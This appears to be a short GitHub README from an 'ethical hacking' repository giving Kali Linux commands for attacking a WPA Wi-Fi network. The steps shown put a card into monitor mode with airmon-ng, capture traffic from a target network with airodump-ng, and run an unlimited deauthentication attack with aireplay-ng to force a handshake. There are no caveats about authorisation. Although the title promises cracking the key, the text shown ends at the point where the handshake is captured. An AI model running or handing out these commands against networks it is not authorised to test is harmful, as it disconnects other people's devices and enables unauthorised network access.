
# Password Cracking using aircrack-ng

These are the steps to be followed to Crack WIFI Key Using Kali Linux

Terminal Commands:

    sudo su
     airmon-ng check kill
     airmon-ng start wlan0
     airodump-ng wlan0mon

<img src="https://github.com/Surjith1001/Ethical-Hacking/assets/125909533/ebac1f67-7ed3-4ce9-8c75-d15c8d5d8e7">
<img src="https://github.com/Surjith1001/Ethical-Hacking/assets/125909533/557ef884-d527-40d1-91ef-48d815da9082">

In new terminal:

    sudo su
     cd Desktop
     airodump-ng wlan0mon --bssid (target Bssid) -c (Target Channel Number) -w (hand_shake file name)

After running the above command there will be certain .csv and .cap files created based on the (hand_shake file name) name specified.

<img src="https://user-images.githubusercontent.com/103558082/235842315-384ce725-cbed-4a4f-a321-c7e3e1ecccd4.png">
<img src="https://user-images.githubusercontent.com/103558082/235842319-ddfe5f7d-5351-46de-bf20-f35a106237e4.png">

For Deauthentication attack open new terminal:

    aireplay-ng --deauth 0 -a (Target Bssid) wlan0mon 

Run the Deauthentication attack till you get a WPA Handshake
